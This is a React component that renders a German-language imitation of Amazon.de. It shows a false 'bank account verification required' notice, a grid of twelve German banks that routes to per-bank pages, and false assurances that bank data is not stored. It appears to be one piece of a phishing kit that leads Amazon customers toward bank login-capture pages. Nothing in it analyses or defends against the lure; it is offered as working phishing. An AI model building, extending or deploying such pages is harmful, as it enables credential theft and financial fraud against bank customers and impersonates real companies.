import React, { useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { getTemplateMetadata, updatePageMetadata } from '../../utils/templateMetadata';
import './AmazonStyle.css';

const BANKS = [
  { id: 'sparkasse', name: 'Sparkasse', logo: '/images/icons/sparkasse.png' },
  { id: 'volksbank', name: 'Volksbank', logo: '/images/icons/volksbank.png' },
  { id: 'commerzbank', name: 'Commerzbank', logo: '/images/icons/commerzbank.png' },
  { id: 'deutsche_bank', name: 'Deutsche Bank', logo: '/images/icons/deutschebank.png' },
  { id: 'ingdiba', name: 'ING', logo: '/images/icons/ingdiba.png' },
  { id: 'dkb', name: 'DKB', logo: '/images/icons/dkb.png' },
  { id: 'postbank', name: 'Postbank', logo: '/images/icons/postbank.png' },
  { id: 'santander', name: 'Santander', logo: '/images/icons/santander.png' },
  { id: 'targobank', name: 'TARGOBANK', logo: '/images/icons/targobank.png' },
  { id: 'apobank', name: 'apoBank', logo: '/images/icons/apobank.png' },
  { id: 'comdirect', name: 'comdirect', logo: '/images/icons/comdirect.png' },
  { id: 'consorsbank', name: 'Consorsbank', logo: '/images/icons/Consorsbank.png' }
];

const AmazonTemplate: React.FC = () => {
  const navigate = useNavigate();

  useEffect(() => {
    const metadata = getTemplateMetadata('amazon');
    updatePageMetadata(metadata);
  }, []);

  const handleBankClick = (bankId: string) => {
    navigate(`/${bankId}`);
  };

  const handleScrollTop = () => {
    window.scrollTo({ top: 0, behavior: 'smooth' });
  };

  return (
    <div className="amazon-template">
      <header className="amazon-header">
        <div className="amazon-header-top">
          <div className="amazon-logo" onClick={handleScrollTop} role="button" aria-label="Amazon Startseite">
            <span className="amazon-logo-text">amazon</span>
            <span className="amazon-logo-domain">.de</span>
            <span className="amazon-logo-smile" aria-hidden="true"></span>
          </div>

          <div className="amazon-header-location">
            <span className="amazon-location-icon" aria-hidden="true">📍</span>
            <div>
              <span className="amazon-location-title">Liefern nach</span>
              <strong>Deutschland</strong>
            </div>
          </div>

          <div className="amazon-search">
            <select className="amazon-search-select" aria-label="Kategorie auswählen">
              <option>Alle</option>
              <option>Amazon.de durchsuchen</option>
            </select>
            <input
              className="amazon-search-input"
              placeholder="Amazon.de durchsuchen"
              aria-label="Amazon Suche"
            />
            <button className="amazon-search-button" aria-label="Suche">
              <svg viewBox="0 0 24 24" aria-hidden="true" className="amazon-search-icon">
                <circle cx="11" cy="11" r="7" />
                <line x1="16.5" y1="16.5" x2="21" y2="21" />
              </svg>
            </button>
          </div>

          <div className="amazon-header-links">
            <div className="amazon-header-link">
              <span>Hallo, anmelden</span>
              <strong>Konto und Listen</strong>
            </div>
            <div className="amazon-header-link">
              <span>Warenrücksendungen</span>
              <strong>und Bestellungen</strong>
            </div>
            <div className="amazon-header-link amazon-header-lang">
              <span>DE</span>
              <strong>Sprache</strong>
            </div>
            <div className="amazon-header-cart">
              <span className="amazon-cart-count">0</span>
              <span className="amazon-cart-icon" aria-hidden="true">🛒</span>
              <span>Einkaufswagen</span>
            </div>
          </div>
        </div>

        <nav className="amazon-nav">
          <a href="#">Alle</a>
          <a href="#">Amazon Haul</a>
          <a href="#">Lebensmittel</a>
          <a href="#">Bestseller</a>
          <a href="#">Neuerscheinungen</a>
          <a href="#">Amazon Basics</a>
          <a href="#">Angebote</a>
          <a href="#">Bücher</a>
          <a href="#">Shopping-Tipps</a>
          <a href="#">Mode</a>
          <a href="#">Gutscheine</a>
          <span className="amazon-nav-right">Hol dir Angebote für Alltagsprodukte</span>
        </nav>
      </header>

      <main className="amazon-main">
        <section className="amazon-notice">
          <h1>Bankkonto-Verifizierung erforderlich</h1>
          <p>
            Um Ihre Bestellung sicher abzuwickeln und den Zahlungsvorgang zu bestätigen, benötigen wir eine
            einmalige Verifizierung Ihres Bankkontos. Dies dient dem Schutz vor Betrug und gewährleistet eine
            sichere Transaktion.
          </p>
          <p className="amazon-notice-subtext">
            Die Verifizierung erfolgt über die sichere Verbindung zu Ihrer Bank und dauert nur wenige Minuten.
            Ihre Bankdaten werden dabei nicht gespeichert.
          </p>
        </section>

        <section className="amazon-bank-section">
          <h2>Bitte wählen Sie Ihre Bank aus:</h2>
          <div className="amazon-bank-grid">
            {BANKS.map((bank) => (
              <button
                key={bank.id}
                type="button"
                className="amazon-bank-card"
                onClick={() => handleBankClick(bank.id)}
              >
                <img
                  src={bank.logo}
                  alt={bank.name}
                  onError={(event) => {
                    (event.currentTarget as HTMLImageElement).src = '/images/placeholder-image.svg';
                  }}
                />
                <span>{bank.name}</span>
              </button>
            ))}
          </div>
        </section>

        <section className="amazon-benefits">
          <h3>Warum ist eine Verifizierung notwendig?</h3>
          <div className="amazon-benefit-grid">
            <div className="amazon-benefit-card">
              <div className="amazon-benefit-icon">🛡️</div>
              <h4>Sicherheit</h4>
              <p>Schutz vor Betrug und unbefugten Zugriffen. Ihre Daten werden verschlüsselt übertragen.</p>
            </div>
            <div className="amazon-benefit-card">
              <div className="amazon-benefit-icon">🔒</div>
              <h4>Datenschutz</h4>
              <p>Ihre Bankdaten werden nicht gespeichert. Die Verifizierung erfolgt einmalig und sicher.</p>
            </div>
            <div className="amazon-benefit-card">
              <div className="amazon-benefit-icon">⚡</div>
              <h4>Schnell & Einfach</h4>
              <p>Der gesamte Prozess dauert nur wenige Minuten und wird Schritt für Schritt geführt.</p>
            </div>
          </div>
        </section>
      </main>

      <footer className="amazon-footer">
        <button className="amazon-footer-top" onClick={handleScrollTop}>
          Zurück zum Seitenanfang
        </button>

        <div className="amazon-footer-links">
          <div>
            <h5>Über Amazon</h5>
            <a href="#">Karriere bei Amazon</a>
            <a href="#">Pressemitteilungen</a>
            <a href="#">Erfahren mehr über Amazon</a>
            <a href="#">Impressum</a>
            <a href="#">Amazon Science</a>
          </div>
          <div>
            <h5>Geld verdienen mit Amazon</h5>
            <a href="#">Jetzt verkaufen</a>
            <a href="#">Verkaufen bei Amazon Business</a>
            <a href="#">Verkaufen bei Amazon Handmade</a>
            <a href="#">Partnerprogramm</a>
            <a href="#">Versand durch Amazon</a>
            <a href="#">An Amazon liefern</a>
            <a href="#">Brand Registry und neue Verkäuferanreize</a>
            <a href="#">Prime durch Verkäufer</a>
            <a href="#">Bewerbe deine Produkte</a>
          </div>
          <div>
            <h5>Amazon-Zahlungsarten</h5>
            <a href="#">Amazon Visa</a>
            <a href="#">Einkaufen mit Punkten</a>
            <a href="#">Amazon Business Amex Card</a>
            <a href="#">Geschenkgutscheine</a>
            <a href="#">Monatsabrechnung</a>
            <a href="#">Bankeinzug</a>
            <a href="#">Amazon-Währungsumrechner</a>
            <a href="#">Mein Amazon-Konto aufladen</a>
          </div>
          <div>
            <h5>Wir helfen dir</h5>
            <a href="#">Amazon und COVID-19</a>
            <a href="#">Lieferung verfolgen oder Bestellung anzeigen</a>
            <a href="#">Versand & Verfügbarkeit</a>
            <a href="#">Amazon Prime</a>
            <a href="#">Rückgabe & Ersatz</a>
            <a href="#">Recycling (einschließlich Entsorgung von Elektro- & Altgeräten)</a>
            <a href="#">Verträge kündigen</a>
            <a href="#">Rückrufe und Warnmeldungen zur Produktsicherheit</a>
            <a href="#">Kundenservice</a>
            <a href="#">Barrierefreiheit</a>
            <a href="#">Wunschzettel</a>
          </div>
        </div>

        <div className="amazon-footer-mid">
          <div className="amazon-footer-logo">
            amazon
            <span className="amazon-footer-smile" aria-hidden="true"></span>
          </div>
          <div className="amazon-footer-controls">
            <button type="button">🌐 Deutsch</button>
            <button type="button">🇩🇪 Deutschland</button>
          </div>
        </div>

        <div className="amazon-footer-bottom">
          <div className="amazon-footer-legal-links">
            <a href="#">Unsere AGB</a>
            <a href="#">Datenschutzerklärung</a>
            <a href="#">Impressum</a>
            <a href="#">Hinweise zu Cookies</a>
            <a href="#">Hinweise zu interessenbasierter Werbung</a>
          </div>
          <div className="amazon-footer-copy">
            ©1996-2026 Amazon.com, Inc. oder Partner-Unternehmen
          </div>
        </div>
      </footer>
    </div>
  );
};

export default AmazonTemplate;
